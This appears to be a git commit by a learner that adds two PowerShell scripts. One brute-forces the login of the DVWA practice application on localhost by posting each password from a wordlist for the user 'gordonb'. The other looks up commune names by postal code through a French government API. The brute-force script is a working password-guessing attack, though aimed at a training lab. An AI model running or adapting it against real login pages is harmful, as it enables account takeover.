90501313e55fc6387f104ab20813a84290188a78
PizZaYolo35 <florian.wagnier@hotmail.fr>
2018-05-30 14:28:24 +0200

    fourth

---
+++ bf.ps1
@@ -0,0 +1,23 @@
+﻿# brut force
+
+$passwords = get-content -path "C:\Users\Flof\Desktop\script\pass.txt"
+
+$url = "http://localhost/dvwa/login.php"
+
+foreach ($password in $passwords) {
+    $body = @{
+        username = 'gordonb'
+        password = $password
+        Login = 'Login'
+            }
+
+$LoginResponse = Invoke-WebRequest $url -Body $Body -Method 'POST'
+
+    if ($Loginresponse.Content -like "*login failed*") {
+        echo "pas bon"
+        }
+    else {
+    echo "le mot de passe est:" $password
+    break
+    }
+}
---
+++ script20.ps1
@@ -0,0 +1,11 @@
+﻿# demande le numéro du département et le scipt lui affiche le nom du département
+# https://api.gouv.fr/api/api-geo.html
+
+[string]$dep = Read-Host "Donne moi ton code postal"
+
+$res = Invoke-WebRequest https://geo.api.gouv.fr/communes?codePostal=$dep | select content
+$res
+$res2 = $res | ConvertFrom-Json
+
+$res2.nom
+
